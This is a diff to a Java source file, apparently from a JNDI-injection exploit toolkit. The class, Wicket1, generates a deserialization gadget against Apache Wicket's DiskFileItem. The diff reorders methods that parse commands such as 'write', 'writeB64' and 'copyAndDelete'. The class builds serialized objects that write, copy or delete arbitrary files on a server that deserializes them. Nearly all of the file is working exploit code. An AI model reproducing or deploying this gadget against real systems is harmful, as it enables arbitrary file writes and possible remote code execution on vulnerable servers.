@@ -1,9 +1,7 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
-
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.wicket.util.io.DeferredFileOutputStream;
@@ -46,33 +44,6 @@ import java.util.Arrays;
 @Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
 @Authors({Authors.JACOBAINES})
 public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
-    @Override
-    public DiskFileItem getObject(String command) throws Exception {
-        String[] parts   = command.split(";");
-
-        if (parts.length != 3) {
-            throw new IllegalArgumentException("Bad command format.");
-        }
-
-        if ("copyAndDelete".equals(parts[0])) {
-            return copyAndDelete(parts[1], parts[2]);
-        } else if ("write".equals(parts[0])) {
-            return write(parts[1], parts[2].getBytes("US-ASCII"));
-        } else if ("writeB64".equals(parts[0])) {
-            return write(parts[1], Base64.decodeBase64(parts[2]));
-        } else if ("writeOld".equals(parts[0])) {
-            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
-        } else if ("writeOldB64".equals(parts[0])) {
-            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
-        }
-        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
-    }
-
-    @Override
-    public void release(DiskFileItem obj) throws Exception {
-
-    }
-
     private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws IOException, Exception {
         return makePayload(0, copyTo, copyAndDelete, new byte[1]);
     }
@@ -100,5 +71,32 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
         Reflections.setFieldValue(diskFileItem, "dfos", dfos);
         Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
         return diskFileItem;
+    }
+
+    @Override
+    public DiskFileItem getObject(String command) throws Exception {
+        String[] parts = command.split(";");
+
+        if (parts.length != 3) {
+            throw new IllegalArgumentException("Bad command format.");
+        }
+
+        if ("copyAndDelete".equals(parts[0])) {
+            return copyAndDelete(parts[1], parts[2]);
+        } else if ("write".equals(parts[0])) {
+            return write(parts[1], parts[2].getBytes("US-ASCII"));
+        } else if ("writeB64".equals(parts[0])) {
+            return write(parts[1], Base64.decodeBase64(parts[2]));
+        } else if ("writeOld".equals(parts[0])) {
+            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
+        } else if ("writeOldB64".equals(parts[0])) {
+            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
+        }
+        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
+    }
+
+    @Override
+    public void release(DiskFileItem obj) throws Exception {
+
     }
 }
